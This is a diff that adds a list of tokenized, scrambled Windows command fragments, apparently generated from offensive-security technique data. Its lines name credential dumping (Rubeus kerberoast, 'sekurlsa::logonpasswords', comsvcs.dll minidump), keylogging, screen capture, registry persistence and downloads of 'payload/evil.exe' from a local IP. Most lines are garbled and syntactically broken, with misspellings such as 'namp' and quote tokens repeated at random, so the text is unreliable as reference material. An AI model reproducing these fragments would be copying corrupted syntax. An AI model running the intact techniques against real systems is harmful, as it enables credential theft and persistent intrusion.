@@ -1,0 +1,64 @@
+iediagcmd.exe /out $ profile
+domain /add
+net accounts
+rubeus.exe kerberoast windir % \users\ $ { shadow \system32\osk.exe
+reg query
+remove-item -path = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 % reg_dword /v `` cor_profiler = `` cor_profiler administrators
+namp -sn -l '' '' '' $ true in administrators } binpath=
+net `` hkey_current_user\control software\classes\clsid\ '' powershell admins '' ;
+iediagcmd.exe /out $ { output_zip_name } in $ { user_name }
+sekurlsa : :logonpasswords
+explorer.exe -o $ a -name '' t1547.009 /d 1
+add-localgroupmember lsadbextpt -- cor_profiler administrators
+tasklist
+net `` [ -list | localappdata ) \\ $ { copy volumn name = keylog
+rubeus.exe kerberoast windir powershell admins `` @ `` cor_profiler -name `` administrators '' '' -name `` cor_profiler '' -name `` threadingmodel '' -name $ true
+net group `` domain admins `` $ `` hklm\software\microsoft\windows t1547.009 \windows\system32\comsvcs.dll ' /nowrap '' -name driver ''
+net localgroup administrators `` cor_profiler
+sekurlsa : :logonpasswords
+delete $ = : \users\ $ target t1547.009 @ `` hklm\software\microsoft\windows = `` cor_profiler = `` administrators '' -name `` cor_enable_profiling = `` administrators '' '' -name `` cor_profiler -name `` threadingmodel '' '' -name `` threadingmodel '' -name @ : threadingmodel -name `` administrators ''
+net delete administrator administrator
+ffuf -w $ } \inprocserver32 $ target '' /v `` cor_profiler = `` ( -name `` cor_profiler -name '' -name `` threadingmodel '' -name `` threadingmodel -name `` '' autorun '' '' ''
+rubeus.exe shadow unprivileged -t $ { target_ip } -t $ { output_zip_name } @ `` $ target t1547.009 t1547.009 t1547.009 //raw.githubusercontent.com/s3cur3th1ssh1t ' /grant administrators }
+net localgroup shadow hklm\security\policy\secrets
+invoke-screencap $ wscriptshell.createshortcut `` path admins '' `` @ target $ { filename_regex '' ;
+namp -sn /interactive @ % :minidump c : \users\ $ `` hklm\software\microsoft\windows wscript.shell '' `` $ profile c `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam ''
+powershell $ shortcut = `` $ target t1547.009 t1547.009 username )
+net localgroup administrators `` security cor_profiler -name administrators '' -name : exit
+cscript $ domain } -b
+get-keystrokes
+net group `` lsadbextpt `` @ : cor_profiler -name `` autorun '' -name `` keylog
+cmdkey /list
+adfind.exe -f ( $ a -class *
+powershell -ibck $ { filename_regex }
+nbtstat -n
+dumpminitool.exe -o $ { driver_name }
+namp -sn @ '' t1547.009 . $ `` query
+nbtstat -n
+net localgroup `` administrators '' powershell
+namp -sn $ target t1547.009 . `` cor_profiler '' /t reg_sz -name `` driver '' '' /f
+quser
+rundll32 popcalc.dll
+net localgroup administrators `` '' `` $ profile
+adfind.exe -o : @ : $ { filename_regex } username= '' $ : ;
+reg query 0 0 '' t1547.009 consumer file ;
+copy rundll32.exe c : \windows\system32\comsvcs.dll , http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+esentutl.exe /y `` `` autorun $ : inputprovider ''
+quser
+iediagcmd.exe /out '' $ { target_ip
+reg query 1
+python make_image.py $ } -o admins } binpath=
+net localgroup administrators `` cor_profiler ''
+get-keystrokes
+workfolders
+dir /create
+winrar -filter `` 7 tmp.run `` http : tmp.run execution file `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rdrleakdiag.exe /p $ target = `` \system32\osk.exe
+iediagcmd.exe /out `` $ : cor_profiler '' -name `` threadingmodel '' -name `` threadingmodel '' ''
+net delete = `` domain admins $ /f ;
+get-eventlog -list | set-wmiinstance -namespace /format : clearing $ : :golden -executionpolicy objws = http : \software\microsoft\command \microsoft\teams\current\teams.exe
+namp -sn $ target t1547.009 . c : domain admins -name `` $ '' '' rundll32.exe in $ { target volumn name you target $ { registry_path
+reg.exe `` -filepath $ `` hklm\software\microsoft\windows t1547.009 \users\
+cmdkey /list
+bitsadmin.exe /create /add
+net localgroup `` administrators '' '' t1547.009 in administrators '' ''
